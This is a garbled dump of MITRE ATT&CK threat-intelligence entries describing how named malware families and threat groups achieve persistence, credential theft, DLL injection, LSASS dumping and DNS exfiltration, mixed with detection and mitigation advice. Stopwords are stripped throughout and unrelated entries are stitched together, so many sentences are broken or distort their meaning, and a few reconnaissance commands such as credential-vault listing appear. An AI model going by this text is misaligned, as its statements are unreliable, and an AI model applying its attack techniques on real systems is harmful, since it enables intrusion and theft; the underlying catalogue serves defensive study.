<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, requires SSP DLLs signed Microsoft. (Citation: Graeber 2014) (Citation: Configure LSA) [Naid](https://attack.mitre.org/software/S0205) collects domain compromised host.(Citation: Symantec Naid June 2012) [H1N1](https://attack.mitre.org/software/S0132) kills disables services Windows Firewall.(Citation: Cisco H1N1 2) [Magic Hound](https://attack.mitre.org/groups/G0059) Remote Desktop Services targeted systems.(Citation: DFIR Report APT35 ProxyShell March 2022) [APT1](https://attack.mitre.org/groups/G0006) RAR compress files moving victim network.(Citation: Mandiant APT1) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) parse output native `system_profiler` tool determine machine running 4 cores.(Citation: SentinelLabs reversing run-only applescripts 2021) Restrict software installation trusted repositories cautious orphaned software packages. Monitor logs actions gather pods, including discovery API calls unexpected users. Monitor account activity logs actions performed activity Kubernetes dashboard applications. [PowerDuke](https://attack.mitre.org/software/S0139) command current foreground window.(Citation: Volexity PowerDuke November 2016) (Citation: ESET Turla Mosquito Jan 2018)(Citation: ESET Turla Mosquito 2018)(Citation: Secureworks IRON HUNTER Profile) [DarkWatchman](https://attack.mitre.org/software/S0673) execute PowerShell commands PowerShell execute keylogger.(Citation: Prevailion DarkWatchman 2021) data [Remsec](https://attack.mitre.org/software/S0125) encrypted RC5 CBC mode, AES-CBC hardcoded key, RC4, Salsa20. data base64-encoded.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Technical Analysis) Grant access application deployment systems limited authorized administrators. [Wizard Spider](https://attack.mitre.org/groups/G0102) RDP lateral movement.(Citation: CrowdStrike Grim Spider 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020) [RedLeaves](https://attack.mitre.org/software/S0153) port 995 C2.(Citation: PWC Cloud Hopper Technical Annex April 2017) Monitor newly executed processes abuse PowerShell commands scripts execution. [Proton](https://attack.mitre.org/software/S0279) VNC connect systems.(Citation: objsee mac malware 2017) Monitor newly constructed network connections received untrusted hosts.  Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [OutSteel](https://attack.mitre.org/software/S1017) collect compromised host.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) multi-factor authentication user privileged accounts. embedded network devices support TACACS+ RADIUS.  Follow vendor prescribed practices hardening access control.(Citation: Cisco IOS Software Integrity Assurance - TACACS) [Remcos](https://attack.mitre.org/software/S0332) steals modifies data clipboard.(Citation: Riskiq Remcos Jan 2018) [NotPetya](https://attack.mitre.org/software/S0368) [PsExec](https://attack.mitre.org/software/S0029), interacts <code>ADMIN$</code> network share execute commands remote systems.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)(Citation: PsExec Russinovich) [dsquery](https://attack.mitre.org/software/S0105) gather user accounts domain.(Citation: TechNet Dsquery) [SpicyOmelette](https://attack.mitre.org/software/S0646) identify compromised host.(Citation: Secureworks GOLD KINGSWOOD September 2018) [menuPass](https://attack.mitre.org/groups/G0045) valid accounts including shared Managed Service Providers clients environments.(Citation: PWC Cloud Hopper April 2017)(Citation: Symantec Cicada November 2020)(Citation: District Court NY APT10 Indictment December 2018)(Citation: Securelist APT10 March 2021) [Hildegard](https://attack.mitre.org/software/S0601) executed kubelet API command executing commands running containers.(Citation: Unit 42 Hildegard Malware) Monitor newly executed processes applications query Registry, [Reg](https://attack.mitre.org/software/S0075), collect command parameters credentials searched. Correlate activity suspicious behavior active intrusion reduce false positives. Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [FlawedAmmyy](https://attack.mitre.org/software/S0381) established persistence `HKCU\SOFTWARE\microsoft\windows\currentversion\run` registry key.(Citation: Korean FSI TA505 2020) [Sykipot](https://attack.mitre.org/software/S0018) gather list running processes running <code>tasklist /v</code>.(Citation: AlienVault Sykipot 2011) [ShimRat](https://attack.mitre.org/software/S0444) hijacked cryptbase.dll migwiz.exe escalate privileges. prevented User Access Control window appearing.(Citation: FOX-IT 2016 Mofang) [MegaCortex](https://attack.mitre.org/software/S0576) code signing certificates issued fake companies bypass security controls.(Citation: IBM MegaCortex) Monitor Windows Registry values forge credential materials gain access applications Internet services. filtering DNS requests unknown, untrusted, bad domains resources. Resolving DNS requests on-premise/proxy servers disrupt adversary attempts conceal data DNS packets.  [Metamorfo](https://attack.mitre.org/software/S0455) side-loaded malicious DLL file.(Citation: Medium Metamorfo Apr 2020)(Citation: FireEye Metamorfo Apr 2018)(Citation: ESET Casbaneiro Oct 2019)  [BLINDINGCAN](https://attack.mitre.org/software/S0520) attempted hide payload legitimate file names "iconcache.db".(Citation: US-CERT BLINDINGCAN Aug 2020) [Imminent Monitor](https://attack.mitre.org/software/S0434) "Process Watcher" feature monitor processes client crashes closed.(Citation: Imminent Unit42 Dec2019) [BITTER](https://attack.mitre.org/groups/G1002) attempted lure victims malicious attachments delivered spearphishing.(Citation: Cisco Talos Bitter Bangladesh 2022)(Citation: Forcepoint BITTER Pakistan Oct 2016) [POWERSTATS](https://attack.mitre.org/software/S0223) sleep seconds.(Citation: FireEye MuddyWater Mar 2018) [Egregor](https://attack.mitre.org/software/S0554) functionality query local/system time.(Citation: JoeSecurity Egregor 2020) [SYSCON](https://attack.mitre.org/software/S0464) ability execute commands [cmd](https://attack.mitre.org/software/S0106) compromised host.(Citation: Unit 42 CARROTBAT January 2020) [APT32](https://attack.mitre.org/groups/G0050) [Cobalt Strike](https://attack.mitre.org/software/S0154)'s malleable C2 functionality blend network traffic.(Citation: FireEye APT32 2017)(Citation: GitHub Malleable C2)(Citation: Cybereason Cobalt Kitty 2017) group's backdoor exfiltrate data encoding subdomain field DNS packets.(Citation: ESET OceanLotus Mar 2019) Additionally, group's macOS backdoors implements specific format C2 packet involving random values.(Citation: ESET OceanLotus macOS April 2019) (Citation: Mandiant APT1) [Silent Librarian](https://attack.mitre.org/groups/G0122) links e-mails direct victims credential harvesting websites designed targeted organization's login page.(Citation: DOJ Iran Indictments March 2018)(Citation: Phish Labs Silent Librarian)(Citation: Secureworks COBALT DICKENS August 2018)(Citation: Proofpoint TA407 September 2019)(Citation: Secureworks COBALT DICKENS September 2019)(Citation: Malwarebytes Silent Librarian October 2020) Adversaries instruct [Duqu](https://attack.mitre.org/software/S0038) spread laterally copying shares enumerated legitimate credentials (via keylogging means). remote host infected compromised credentials schedule task remote machines executes malware.(Citation: Symantec W32.Duqu) [Mythic](https://attack.mitre.org/software/S0699) transform functions encode randomize C2 data.(Citation: Mythc Documentation)	 Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [TYPEFRAME](https://attack.mitre.org/software/S0263) Windows Firewall victim’s machine incoming connections.(Citation: US-CERT TYPEFRAME June 2018) [Pteranodon](https://attack.mitre.org/software/S0147) copies Startup folder establish persistence.(Citation: Palo Alto Gamaredon Feb 2017) [Lizar](https://attack.mitre.org/software/S0681) Windows API functions victim's machine.(Citation: BiZone Lizar 2021)  images software updated migrate SNMPv3.(Citation: Cisco Blog Legacy Device Attacks) [Ixeshe](https://attack.mitre.org/software/S0015) command delete file machine.(Citation: Trend Micro IXESHE 2012) [Mustang Panda](https://attack.mitre.org/groups/G0129) RAR create password-protected archives collected documents prior exfiltration.(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Avira Mustang Panda January 2020) [MacMa](https://attack.mitre.org/software/S1016) stored collected files locally exfiltration.(Citation: Objective-See MacMa Nov 2021) Monitor newly executed processes abuse task scheduling functionality facilitate initial recurring execution malicious code. [FunnyDream](https://attack.mitre.org/software/S1044) FilepakMonitor component inject Bka.exe process `VirtualAllocEx`, `WriteProcessMemory` `CreateRemoteThread` APIs load DLL component.(Citation: Bitdefender FunnyDream Campaign November 2020) [SideTwist](https://attack.mitre.org/software/S0610) ability search specific files.(Citation: Check APT34 April 2021) [TajMahal](https://attack.mitre.org/software/S0467) ability identify anti-virus products, firewalls, anti-spyware products use.(Citation: Kaspersky TajMahal April 2019) (Citation: FireEye Periscope March 2018) [Smoke Loader](https://attack.mitre.org/software/S0226) searches credentials stored browsers.(Citation: Talos Smoke Loader July 2018) [Donut](https://attack.mitre.org/software/S0695) generate encrypted, compressed/encoded, obfuscated code modules.(Citation: Donut Github) [ROKRAT](https://attack.mitre.org/software/S0240) variety API calls execute shellcode.(Citation: Malwarebytes RokRAT VBA January 2021) [ROCKBOOT](https://attack.mitre.org/software/S0112) Master Boot Record (MBR) bootkit MBR establish persistence.(Citation: FireEye Bootkits) Likewise, software DLL loads collected analyzed, unusual DLL load correlated object Registry modification hijacking performed. [Waterbear](https://attack.mitre.org/software/S0579) DLL loading import load malicious DLL loader.(Citation: Trend Micro Waterbear December 2019)  [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors registered domains C2.(Citation: McAfee Honeybee) Monitor processes viewed inject malicious code processes ptrace (process trace) calls evade process-based defenses elevate privileges. Identify critical business processes targeted adversaries isolate secure systems unauthorized access tampering.  [DanBot](https://attack.mitre.org/software/S1014) delete configuration file installation.(Citation: ClearSky Siamesekitten August 2021) [RegDuke](https://attack.mitre.org/software/S0511) hide data images, including Bit (LSB).(Citation: ESET Dukes October 2019) Ensure local administrator accounts complex, unique passwords. [GrimAgent](https://attack.mitre.org/software/S0632) ability enumerate files directories compromised host.(Citation: IB GrimAgent July 2021) [Attor](https://attack.mitre.org/software/S0438)'s Blowfish key encrypted public RSA key.(Citation: ESET Attor Oct 2019) [Deep Panda](https://attack.mitre.org/groups/G0009) shells publicly accessible servers access victim networks.(Citation: CrowdStrike Deep Panda Shells) [Maze](https://attack.mitre.org/software/S0449) injected malware DLL target process.(Citation: McAfee Maze March 2020)(Citation: Sophos Maze VM September 2020)	 [Earth Lusca](https://attack.mitre.org/groups/G1006) manipulated legitimate websites inject malicious JavaScript code watering hole operations.(Citation: TrendMicro EarthLusca 2022) Monitor contextual data describes activity it. [SharpStage](https://attack.mitre.org/software/S0546) ability capture victim's screen.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020) [Empire](https://attack.mitre.org/software/S0363) exploit vulnerabilities MS16-032 MS16-135.(Citation: Github PowerShell Empire) [PowerShower](https://attack.mitre.org/software/S0441) ability deploy reconnaissance module retrieve list active processes.(Citation: Kaspersky Cloud Atlas August 2019) [ThreatNeedle](https://attack.mitre.org/software/S0665) memory register payload Windows service.(Citation: Kaspersky ThreatNeedle Feb 2021) [H1N1](https://attack.mitre.org/software/S0132) multiple techniques obfuscate strings, including XOR.(Citation: Cisco H1N1 1) [Exaramel Linux](https://attack.mitre.org/software/S0401) HTTPS C2 communications.(Citation: ESET TeleBots Oct 2018)(Citation: ANSSI Sandworm January 2021) [SMOKEDHAM](https://attack.mitre.org/software/S0649) Powershell download UltraVNC [Ngrok](https://attack.mitre.org/software/S0508) third-party file sharing sites.(Citation: FireEye SMOKEDHAM June 2021) [ZxxZ](https://attack.mitre.org/software/S1013) disguised Windows security update service.(Citation: Cisco Talos Bitter Bangladesh 2022) [HotCroissant](https://attack.mitre.org/software/S0431) ability clean installed files, delete files, delete victim’s machine.(Citation: Carbon Black HotCroissant April 2020) Monitor newly executed processes, W32tm.exe utility. (Citation: W32Time 2017) Sysinternals Autoruns tool analyze auto-starting locations, including DLLs listed time providers. (Citation: TechNet Autoruns) [Sibot](https://attack.mitre.org/software/S0589) checked compromised configured proxies.(Citation: MSTIC NOBELIUM Mar 2021) [Dipsind](https://attack.mitre.org/software/S0200) variant registers Winlogon Event Notify DLL establish persistence.(Citation: PLATINUM April 2016) [Cobalt Strike](https://attack.mitre.org/software/S0154) modify Registry values <code>HKEY_CURRENT_USER\Software\Microsoft\Office\<Excel Version>\Excel\Security\AccessVBOM\</code> enable execution additional code.(Citation: Talos Cobalt Strike September 2020) [4H RAT](https://attack.mitre.org/software/S0065) command control.(Citation: CrowdStrike Putter Panda) [APT32](https://attack.mitre.org/groups/G0050) set operated websites gather deliver malware.(Citation: Volexity Ocean Lotus November 2020) [SeaDuke](https://attack.mitre.org/software/S0053) compressed data zlib prior sending C2.(Citation: Mandiant Easy Breach) "Uploader" variant [HAMMERTOSS](https://attack.mitre.org/software/S0037) visits hard-coded server HTTP/S download images [HAMMERTOSS](https://attack.mitre.org/software/S0037) receive commands.(Citation: FireEye APT29) [Bad Rabbit](https://attack.mitre.org/software/S0606)’s <code>infpub.dat</code> file creates scheduled task launch malicious executable.(Citation: Secure List Bad Rabbit) [Empire](https://attack.mitre.org/software/S0363) ability automatically send collected data threat actors' C2.(Citation: Talos Frankenstein June 2019) [FIN8](https://attack.mitre.org/groups/G0061) exploited CVE-2016-0167 local vulnerability.(Citation: FireEye Fin8 2016)(Citation: FireEye Enemy FIN8 Aug 2016) [Dipsind](https://attack.mitre.org/software/S0200) configured normal hours, communications harder distinguish normal traffic.(Citation: PLATINUM April 2016) [Milan](https://attack.mitre.org/software/S1015) identify users registered targeted machine.(Citation: ClearSky Siamesekitten August 2021) [PowerSploit](https://attack.mitre.org/software/S0194) collection Privesc-PowerUp modules discover exploit path interception opportunities services, processes, variables.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [APT38](https://attack.mitre.org/groups/G0082) VBScript execute commands operational tasks.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Hildegard](https://attack.mitre.org/software/S0601) masscan search kubelets kubelet API additional running containers.(Citation: Unit 42 Hildegard Malware)  [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors Base64 encode files custom key.(Citation: McAfee Honeybee) [Kessel](https://attack.mitre.org/software/S0487) split data exilftrated chunks fit subdomains DNS queries.(Citation: ESET ForSSHe December 2018) [PcShare](https://attack.mitre.org/software/S1050) execute `cmd` commands compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Require executables write-protected directories. [Cardinal RAT](https://attack.mitre.org/software/S0348) log keystrokes.(Citation: PaloAlto CardinalRat Apr 2017) Integrating multi-factor authentication (MFA) organizational policy greatly reduce risk adversary gaining control valid credentials additional tactics initial access, lateral movement, collecting information. MFA restrict access cloud resources APIs. [UBoatRAT](https://attack.mitre.org/software/S0333) GitHub public blog service Hong Kong C2 communications.(Citation: PaloAlto UBoatRAT Nov 2017) (Citation: Baumgartner Naikon 2015)(Citation: CameraShy) [Ursnif](https://attack.mitre.org/software/S0386) encoded data URLs C2.(Citation: ProofPoint Ursnif Aug 2016)	 [InvisiMole](https://attack.mitre.org/software/S0260) capture screenshots entire screen, separate window open, overlapping.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) collects Internet adapter configuration.(Citation: Symantec Dragonfly)(Citation: Gigamon Berserk Bear October 2021) [Sibot](https://attack.mitre.org/software/S0589) obfuscated scripts execution.(Citation: MSTIC NOBELIUM Mar 2021) [Imminent Monitor](https://attack.mitre.org/software/S0434) CommandPromptPacket ScriptPacket module(s) creating remote executing scripts.(Citation: QiAnXin APT-C-36 Feb2019) [GALLIUM](https://attack.mitre.org/groups/G0093) Taiwan-based servers exclusive [GALLIUM](https://attack.mitre.org/groups/G0093).(Citation: GALLIUM December 2019) [OilRig](https://attack.mitre.org/groups/G0049) tool called CANDYKING capture screenshot user's desktop.(Citation: FireEye APT34 Webinar Dec 2017) [Magic Hound](https://attack.mitre.org/groups/G0059) Powershell discover email accounts.(Citation: DFIR Report APT35 ProxyShell March 2022) Monitor newly constructed processes indicative modifying account settings, modify `authorized_keys` `/etc/ssh/sshd_config` files.  [PoshC2](https://attack.mitre.org/software/S0378) module recursively parsing files directories gather valid credit card numbers.(Citation: GitHub PoshC2) [JPIN](https://attack.mitre.org/software/S0201) variant downloads backdoor payload BITS service.(Citation: PLATINUM April 2016) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors’ XServer tool communicated HTTPS.(Citation: FoxIT Wocao December 2019) [Winnti Linux](https://attack.mitre.org/software/S0430) decoded XOR encoded strings holding configuration execution.(Citation: Chronicle Winnti Linux 2019) [WellMess](https://attack.mitre.org/software/S0514) send files victim machine C2.(Citation: PWC WellMess July 2020)(Citation: CISA WellMess July 2020) [Bumblebee](https://attack.mitre.org/software/S1039) ability set hardcoded randomized sleep interval.(Citation: Proofpoint Bumblebee April 2022) [MarkiRAT](https://attack.mitre.org/software/S0652) drop payload Startup directory ensure automatically runs compromised started.(Citation: Kaspersky Ferocious Kitten Jun 2021) Monitor windows registry values execute malicious payloads hijacking operating systems programs. [APT19](https://attack.mitre.org/groups/G0073) Port 22 malware variant modify Registry keys.(Citation: Unit 42 C0d0so0 Jan 2016) [Zebrocy](https://attack.mitre.org/software/S0251) enumerates connected storage devices.(Citation: Unit42 Cannon Nov 2018) [Carbon](https://attack.mitre.org/software/S0335) collect IP address victims computers network commands: <code>ipconfig -all</code> <code>nbtstat -n</code>, <code>nbtstat -s</code>.(Citation: ESET Carbon Mar 2017)(Citation: GovCERT Carbon 2016) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors spearphishing emails send malicious Word documents.(Citation: Talos Frankenstein June 2019) [HAWKBALL](https://attack.mitre.org/software/S0391) communicate single hard-coded C2 server.(Citation: FireEye HAWKBALL Jun 2019) [CharmPower](https://attack.mitre.org/software/S0674) decrypt downloaded modules prior execution.(Citation: Check APT35 CharmPower January 2022) [RTM](https://attack.mitre.org/software/S0148) list smart card readers attached victim.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) [Carbanak](https://attack.mitre.org/software/S0030) custom binary protocol C2 communications.(Citation: FireEye CARBANAK June 2017) (Citation: Secureworks IRON VIKING ) [Thrip](https://attack.mitre.org/groups/G0076) WinSCP exfiltrate data targeted organization FTP.(Citation: Symantec Thrip June 2018) [APT32](https://attack.mitre.org/groups/G0050)'s backdoor query Windows Registry gather information. (Citation: ESET OceanLotus Mar 2019) [Dragonfly](https://attack.mitre.org/groups/G0035) compromised websites redirect traffic host exploit kits.(Citation: Gigamon Berserk Bear October 2021) [MegaCortex](https://attack.mitre.org/software/S0576) changed user account passwords logged users system.(Citation: IBM MegaCortex) Monitor /proc files inject malicious code processes /proc filesystem evade process-based defenses elevate privileges. Users permission modify cases.  [FinFisher](https://attack.mitre.org/software/S0182) variant custom packer.(Citation: FinFisher Citation)(Citation: Securelist BlackOasis Oct 2017) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [FIN6](https://attack.mitre.org/groups/G0037) collected exfiltrated payment card data compromised systems.(Citation: Trend Micro FIN6 October 2019)(Citation: RiskIQ British Airways September 2018)(Citation: RiskIQ Newegg September 2018) [Bumblebee](https://attack.mitre.org/software/S1039) `odbcconf.exe` DLLs targeted hosts.(Citation: Cybereason Bumblebee August 2022) [WindTail](https://attack.mitre.org/software/S0466) delivered compressed, encrypted, encoded payload.(Citation: objective-see windtail2 jan 2019) [Zebrocy](https://attack.mitre.org/software/S0251) username system.(Citation: ESET Zebrocy Nov 2018)(Citation: CISA Zebrocy Oct 2020) [NETWIRE](https://attack.mitre.org/software/S0198) executed VBScripts.(Citation: FireEye NETWIRE March 2019)(Citation: Proofpoint NETWIRE December 2020) (Citation: Lab52 WIRTE Apr 2019) [PlugX](https://attack.mitre.org/software/S0013) DLL side-loading evade anti-virus.(Citation: FireEye Clandestine Fox 2)(Citation: Dell TG-3390)(Citation: Stewart 2014)(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Palo Alto PlugX June 2017)(Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020) [Kazuar](https://attack.mitre.org/software/S0265) obfuscated source ConfuserEx protector. [Kazuar](https://attack.mitre.org/software/S0265) obfuscates created files/folders/mutexes encrypts debug messages written log files Rijndael cipher.(Citation: Unit 42 Kazuar 2017) (Citation: Securelist APT10 March 2021) (Citation: SecureList Silence Nov 2017) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Duqu](https://attack.mitre.org/software/S0038) creates service loads malicious driver starts. Duqu active, operating believes driver legitimate, signed valid private key.(Citation: Symantec W32.Duqu) [HAFNIUM](https://attack.mitre.org/groups/G0125) <code>procdump</code> dump LSASS process memory.(Citation: HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021) Monitor Azure Activity Logs unexpected modifications Service Principals Applications. [SpeakUp](https://attack.mitre.org/software/S0374) checks availability specific ports servers.(Citation: CheckPoint SpeakUp Feb 2019) [Smoke Loader](https://attack.mitre.org/software/S0226) C2.(Citation: Malwarebytes SmokeLoader 2016) [Chimera](https://attack.mitre.org/groups/G0114) cleared event logs compromised hosts.(Citation: NCC Chimera January 2021) Monitor suspicious network traffic indicative probing user information, large/iterative quantities authentication requests originating single source (especially source adversary/botnet). Analyzing metadata reveal artifacts attributed malicious activity, referer user-agent string HTTP/S fields. [POWERSTATS](https://attack.mitre.org/software/S0223) ports 8060 8888 C2.(Citation: Unit 42 MuddyWater Nov 2017) Ensure proper permissions set Registry hives prevent users modifying components lead privilege escalation.  [BADNEWS](https://attack.mitre.org/software/S0128) signed invalid Authenticode certificate apparent effort legitimate.(Citation: TrendMicro Patchwork Dec 2017) [Matryoshka](https://attack.mitre.org/software/S0167) establish persistence adding Registry keys.(Citation: ClearSky Wilted Tulip July 2017)(Citation: CopyKittens Nov 2015) [Green Lambert](https://attack.mitre.org/software/S0690) Keychain Services API functions collect passwords, `SecKeychainFindInternetPassword` `SecKeychainItemCopyAttributesAndData`.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  Monitor executed commands arguments suspicious activity listing credentials Windows Credentials locker (e.g. <code>vaultcmd /listcreds:“Windows Credentials”</code>).(Citation: Malwarebytes Windows Vault) Follow vendor device hardening practices disable unnecessary unused features services, avoid default configurations passwords, introduce logging auditing detection. [CookieMiner](https://attack.mitre.org/software/S0492) loaded coinmining software systems Koto cryptocurrency. (Citation: Unit42 CookieMiner Jan 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) list local members.(Citation: GitHub SILENTTRINITY Modules July 2019) [Rocke](https://attack.mitre.org/groups/G0106) distributed cryptomining malware.(Citation: Talos Rocke August 2018)(Citation: Unit 42 Rocke January 2019) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) command execute commands.(Citation: CISA MAR SLOTHFULMEDIA October 2020) Monitor executed commands arguments gather victim's DNS targeting. [Chimera](https://attack.mitre.org/groups/G0114) [Cobalt Strike](https://attack.mitre.org/software/S0154) encapsulate C2 DNS traffic.(Citation: NCC Chimera January 2021) [Kessel](https://attack.mitre.org/software/S0487) create reverse infected host system.(Citation: ESET ForSSHe December 2018)	 [Doki](https://attack.mitre.org/software/S0600)’s container configured bind host root directory.(Citation: Intezer Doki July 20) [APT32](https://attack.mitre.org/groups/G0050) cmd.exe execution.(Citation: Cybereason Cobalt Kitty 2017)  [BLINDINGCAN](https://attack.mitre.org/software/S0520) encoded C2 traffic Base64.(Citation: US-CERT BLINDINGCAN Aug 2020) Disallow loading remote DLLs. included default Windows Server 2012+ patch XP+ Server 2003+.

Enable Safe DLL Search Mode force search DLLs directories restrictions (e.g. <code>%SYSTEMROOT%</code>)to local directory DLLs (e.g. user's directory)

The Safe DLL Search Mode enabled Policy Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. Windows Registry key located <code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDLLSearchMode</code>(Citation: DLL)(Citation: Dynamic Link Library Search Order) [Remsec](https://attack.mitre.org/software/S0125) harvests plain-text credentials password filter registered domain controllers.(Citation: Kaspersky ProjectSauron Report) Ensure event tracers/forwarders (Citation: ETW 2018), firewall policies, mechanisms secured permissions access controls manipulated user accounts. [APT32](https://attack.mitre.org/groups/G0050)'s backdoor exfiltrate data encoding subdomain field DNS packets.(Citation: ESET OceanLotus Mar 2019) [Regin](https://attack.mitre.org/software/S0019) stage 1 modules 64-bit systems signed fake certificates masquerading originating Corporation Broadcom Corporation.(Citation: Kaspersky Regin) [Hancitor](https://attack.mitre.org/software/S0499) relied users clicking malicious link delivered phishing.(Citation: Threatpost Hancitor) [Gamaredon Group](https://attack.mitre.org/groups/G0047) malware collected Office documents mapped network drives.(Citation: ESET Gamaredon June 2020) [Agent Tesla](https://attack.mitre.org/software/S0331) gather credentials browsers.(Citation: Bitdefender Agent Tesla April 2020)  Monitor API calls collect data stored clipboard users copying applications. [Ferocious Kitten](https://attack.mitre.org/groups/G0137) attempted convince victims enable malicious content spearphishing email including odd decoy message.(Citation: Kaspersky Ferocious Kitten Jun 2021) Monitor executed commands arguments consist logon scripts unusual access abnormal users abnormal times. [Kinsing](https://attack.mitre.org/software/S0599) chmod modify permissions key files use.(Citation: Aqua Kinsing April 2020) Enable Windows firewall, prevents DCOM instantiation default. [Grandoreiro](https://attack.mitre.org/software/S0531) modify binary ACL prevent security tools running.(Citation: ESET Grandoreiro April 2020) [Machete](https://attack.mitre.org/groups/G0095) embedded malicious macros spearphishing attachments download additional files.(Citation: 360 Machete Sep 2020) [Skidmap](https://attack.mitre.org/software/S0468) checked existence specific files including <code>/usr/sbin/setenforce</code> <code> /etc/selinux/config</code>. ability monitor cryptocurrency miner file process. (Citation: Trend Micro Skidmap)  Periodically baseline virtual machine images identify malicious modifications additions. Traffic anonymity networks C2 infrastructure blocked network block lists. blocking circumvented techniques [Domain Fronting](https://attack.mitre.org/techniques/T1090/004). Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [APT37](https://attack.mitre.org/groups/G0067) spearphishing attachments attempting user them.(Citation: FireEye APT37 Feb 2018) [Matryoshka](https://attack.mitre.org/software/S0167) reflective DLL injection inject malicious library execute RAT.(Citation: CopyKittens Nov 2015) [Rocke](https://attack.mitre.org/groups/G0106) compiled malware, delivered victims .c files, GNU Compiler Collection (GCC).(Citation: Anomali Rocke March 2019)	 [QakBot](https://attack.mitre.org/software/S0650) identify user compromised system.(Citation: Kaspersky QakBot September 2021) Segment networks systems appropriately reduce access critical systems services controlled methods. [CookieMiner](https://attack.mitre.org/software/S0492) steal Google Chrome Apple Safari browser cookies victim’s machine. (Citation: Unit42 CookieMiner Jan 2019) (Citation: SentinelOne Aoqin Dragon June 2022) (Citation: Mandiant APT1) version [KONNI](https://attack.mitre.org/software/S0356) dropped Windows shortcut Startup folder establish persistence.(Citation: Talos Konni 2017) (Citation: Securelist DarkVishnya Dec 2018)  Remove vulnerable Policy Preferences.(Citation: MS14-025) Monitor newly constructed network connections received untrusted hosts uncommon data flows (e.g. unusual network communications suspicious communications sending fixed size data packets regular intervals unusually connection patterns). analyzing packet contents detect application layer protocols, leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, protocol port mismatch, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments (e.g. monitor anomalies files initiate network connections unusual connections initiated Prevent critical business processes replaced, overwritten, reconfigured load malicious code. [HELLOKITTY](https://attack.mitre.org/software/S0617) embedded RSA-2048 public key encrypt victim data ransom.(Citation: FireEye FiveHands April 2021) [PowerShower](https://attack.mitre.org/software/S0441) backdoor written PowerShell.(Citation: Unit 42 Inception November 2018) Ensure local administrator accounts complex, unique passwords systems network. permissions applied specific users edit startup items leveraged privilege escalation. (Citation: CrowdStrike Putter Panda) Ensure proper Registry permissions prevent adversaries disabling interfering logging. addition MiniNT registry key disables Event Viewer.(Citation: def_ev_win_event_logging) [Grandoreiro](https://attack.mitre.org/software/S0531) payload delivered encrypted custom XOR-based algorithm base64-encoded ZIP file.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: ESET Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [Gold Dragon](https://attack.mitre.org/software/S0249) download additional components C2 server.(Citation: McAfee Gold Dragon) Monitor suspicious processes modifying authorized_keys /etc/ssh/sshd_config files. [Empire](https://attack.mitre.org/software/S0363) leverage WMI debugging remotely replace binaries sethc.exe, Utilman.exe, Magnify.exe cmd.exe.(Citation: Github PowerShell Empire) Monitor network data uncommon data flows, unexpected surges abnormal inbound/outbound patterns. [Evilnum](https://attack.mitre.org/groups/G0120) spearphishing emails link zip file hosted Google Drive.(Citation: ESET EvilNum July 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) disabled host-based firewalls. globally port 3389.(Citation: US-CERT TA18-074A) [APT19](https://attack.mitre.org/groups/G0073) performed watering hole attack forbes.com 2014 compromise targets.(Citation: Unit 42 C0d0so0 Jan 2016) [MuddyWater](https://attack.mitre.org/groups/G0069) file sharing services including OneHub distribute tools.(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021) [Comnie](https://attack.mitre.org/software/S0244) <code>net user</code> command.(Citation: Palo Alto Comnie) [Cannon](https://attack.mitre.org/software/S0351) gather username system.(Citation: Unit42 Cannon Nov 2018) [Matryoshka](https://attack.mitre.org/software/S0167) capable stealing Outlook passwords.(Citation: ClearSky Wilted Tulip July 2017)(Citation: CopyKittens Nov 2015) [PoetRAT](https://attack.mitre.org/software/S0428) file monitoring track modification 